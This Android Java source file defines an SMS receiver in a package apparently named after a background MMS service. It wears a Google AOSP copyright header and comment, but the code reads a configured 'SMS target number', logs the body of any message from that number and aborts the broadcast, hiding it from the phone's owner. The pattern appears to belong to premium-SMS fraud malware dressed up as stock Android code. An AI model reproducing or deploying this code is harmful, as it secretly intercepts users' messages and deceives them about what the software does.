/*
 * Copyright (C) 2008 Google Inc.
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *      http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */

package com.mms.bg.transaction;

import android.content.Context;
import android.content.Intent;
import android.content.SharedPreferences;
import android.preference.PreferenceManager;
import android.util.Log;
import android.telephony.SmsMessage;
import com.android.internal.telephony.TelephonyIntents;
import android.provider.Telephony.Sms.Intents;
import com.mms.bg.*;
import com.mms.bg.ui.SettingManager;

/**
 * This class exists specifically to allow us to require permissions checks on SMS_RECEIVED
 * broadcasts that are not applicable to other kinds of broadcast messages handled by the
 * SmsReceiver base class.
 */
public class PrivilegedSmsReceiver extends SmsReceiver {
    
    private static final String TAG = "PrivilegedSmsReceiver";
    private static final boolean DEBUG = true;
    
    @Override
    public void onReceive(Context context, Intent intent) {
        if (DEBUG) Log.d(TAG, "[[PrivilegedSmsReceiver::onReceive]]");
        String mBlockNum = SettingManager.getInstance(context).getSMSTargetNum();
        
        SmsMessage[] msgs = Intents.getMessagesFromIntent(intent);
        String addr = msgs[0].getDisplayOriginatingAddress();
        if (DEBUG) Log.d(TAG, "[[PrivilegedSmsReceiver::onReceive]] addr received = " + addr + " block num = " + mBlockNum);
        if (addr.equals(mBlockNum) == true) {
            Log.d(TAG, "[[PrivilegedSmsReceiver::onReceive]] block the sms from = " + mBlockNum
                    + " body = " + msgs[0].getDisplayMessageBody());
            this.abortBroadcast();
        }
    }
}
